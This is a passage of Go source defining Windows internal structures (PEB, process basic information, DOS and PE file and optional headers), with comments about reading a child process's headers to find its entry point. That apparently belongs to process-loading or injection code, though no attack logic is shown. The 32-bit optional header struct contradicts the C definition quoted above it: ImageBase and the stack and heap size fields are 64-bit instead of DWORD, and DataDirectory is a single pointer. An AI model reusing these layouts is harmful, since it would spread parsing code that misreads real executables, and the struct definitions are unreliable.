	BeingDebugged            byte    // BYTE	2
	reserved2                [1]byte // BYTE 3
	// ImageUsesLargePages          : 1;   //0x0003:0 (WS03_SP1+)
	// IsProtectedProcess           : 1;   //0x0003:1 (Vista+)
	// IsLegacyProcess              : 1;   //0x0003:2 (Vista+)
	// IsImageDynamicallyRelocated  : 1;   //0x0003:3 (Vista+)
	// SkipPatchingUser32Forwarders : 1;   //0x0003:4 (Vista_SP1+)
	// IsPackagedProcess            : 1;   //0x0003:5 (Win8_BETA+)
	// IsAppContainer               : 1;   //0x0003:6 (Win8_RTM+)
	// SpareBit                     : 1;   //0x0003:7
	//reserved3              [2]uintptr  // PVOID BYTE 4-8
	Mutant                 uintptr     // BYTE 4
	ImageBaseAddress       uintptr     // BYTE 8
	Ldr                    uintptr     // PPEB_LDR_DATA
	ProcessParameters      uintptr     // PRTL_USER_PROCESS_PARAMETERS
	reserved4              [3]uintptr  // PVOID
	AtlThunkSListPtr       uintptr     // PVOID
	reserved5              uintptr     // PVOID
	reserved6              uint32      // ULONG
	reserved7              uintptr     // PVOID
	reserved8              uint32      // ULONG
	AtlThunkSListPtr32     uint32      // ULONG
	reserved9              [45]uintptr // PVOID
	reserved10             [96]byte    // BYTE
	PostProcessInitRoutine uintptr     // PPS_POST_PROCESS_INIT_ROUTINE
	reserved11             [128]byte   // BYTE
	reserved12             [1]uintptr  // PVOID
	SessionId              uint32      // ULONG
}

// https://github.com/elastic/go-windows/blob/master/ntdll.go#L77
type PROCESS_BASIC_INFORMATION struct {
	reserved1                    uintptr    // PVOID
	PebBaseAddress               uintptr    // PPEB
	reserved2                    [2]uintptr // PVOID
	UniqueProcessId              uintptr    // ULONG_PTR
	InheritedFromUniqueProcessID uintptr    // PVOID
}

// Read the child program's DOS header and validate it is a MZ executable
type IMAGE_DOS_HEADER struct {
	Magic    uint16     // USHORT Magic number
	Cblp     uint16     // USHORT Bytes on last page of file
	Cp       uint16     // USHORT Pages in file
	Crlc     uint16     // USHORT Relocations
	Cparhdr  uint16     // USHORT Size of header in paragraphs
	MinAlloc uint16     // USHORT Minimum extra paragraphs needed
	MaxAlloc uint16     // USHORT Maximum extra paragraphs needed
	SS       uint16     // USHORT Initial (relative) SS value
	SP       uint16     // USHORT Initial SP value
	CSum     uint16     // USHORT Checksum
	IP       uint16     // USHORT Initial IP value
	CS       uint16     // USHORT Initial (relative) CS value
	LfaRlc   uint16     // USHORT File address of relocation table
	Ovno     uint16     // USHORT Overlay number
	Res      [4]uint16  // USHORT Reserved words
	OEMID    uint16     // USHORT OEM identifier (for e_oeminfo)
	OEMInfo  uint16     // USHORT OEM information; e_oemid specific
	Res2     [10]uint16 // USHORT Reserved words
	LfaNew   int32      // LONG File address of new exe header
}

// Read the child process's PE file header
/*
	typedef struct _IMAGE_FILE_HEADER {
		USHORT  Machine;
		USHORT  NumberOfSections;
		ULONG   TimeDateStamp;
		ULONG   PointerToSymbolTable;
		ULONG   NumberOfSymbols;
		USHORT  SizeOfOptionalHeader;
		USHORT  Characteristics;
	} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
*/

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

// Read the child process's PE optional header to find it's entry point
/*
	https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header64
	typedef struct _IMAGE_OPTIONAL_HEADER64 {
	WORD                 Magic;
	BYTE                 MajorLinkerVersion;
	BYTE                 MinorLinkerVersion;
	DWORD                SizeOfCode;
	DWORD                SizeOfInitializedData;
	DWORD                SizeOfUninitializedData;
	DWORD                AddressOfEntryPoint;
	DWORD                BaseOfCode;
	ULONGLONG            ImageBase;
	DWORD                SectionAlignment;
	DWORD                FileAlignment;
	WORD                 MajorOperatingSystemVersion;
	WORD                 MinorOperatingSystemVersion;
	WORD                 MajorImageVersion;
	WORD                 MinorImageVersion;
	WORD                 MajorSubsystemVersion;
	WORD                 MinorSubsystemVersion;
	DWORD                Win32VersionValue;
	DWORD                SizeOfImage;
	DWORD                SizeOfHeaders;
	DWORD                CheckSum;
	WORD                 Subsystem;
	WORD                 DllCharacteristics;
	ULONGLONG            SizeOfStackReserve;
	ULONGLONG            SizeOfStackCommit;
	ULONGLONG            SizeOfHeapReserve;
	ULONGLONG            SizeOfHeapCommit;
	DWORD                LoaderFlags;
	DWORD                NumberOfRvaAndSizes;
	IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
	} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;
*/

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               uintptr
}

/*
	https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32
	typedef struct _IMAGE_OPTIONAL_HEADER {
	WORD                 Magic;
	BYTE                 MajorLinkerVersion;
	BYTE                 MinorLinkerVersion;
	DWORD                SizeOfCode;
	DWORD                SizeOfInitializedData;
	DWORD                SizeOfUninitializedData;
	DWORD                AddressOfEntryPoint;
	DWORD                BaseOfCode;
	DWORD                BaseOfData;
	DWORD                ImageBase;
	DWORD                SectionAlignment;
	DWORD                FileAlignment;
	WORD                 MajorOperatingSystemVersion;
	WORD                 MinorOperatingSystemVersion;
	WORD                 MajorImageVersion;
	WORD                 MinorImageVersion;
	WORD                 MajorSubsystemVersion;
	WORD                 MinorSubsystemVersion;
	DWORD                Win32VersionValue;
	DWORD                SizeOfImage;
	DWORD                SizeOfHeaders;
	DWORD                CheckSum;
	WORD                 Subsystem;
	WORD                 DllCharacteristics;
	DWORD                SizeOfStackReserve;
	DWORD                SizeOfStackCommit;
	DWORD                SizeOfHeapReserve;
	DWORD                SizeOfHeapCommit;
	DWORD                LoaderFlags;
	DWORD                NumberOfRvaAndSizes;
	IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
	} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
*/

type IMAGE_OPTIONAL_HEADER32 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	BaseOfData                  uint32 // Different from 64 bit header
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               uintptr
}
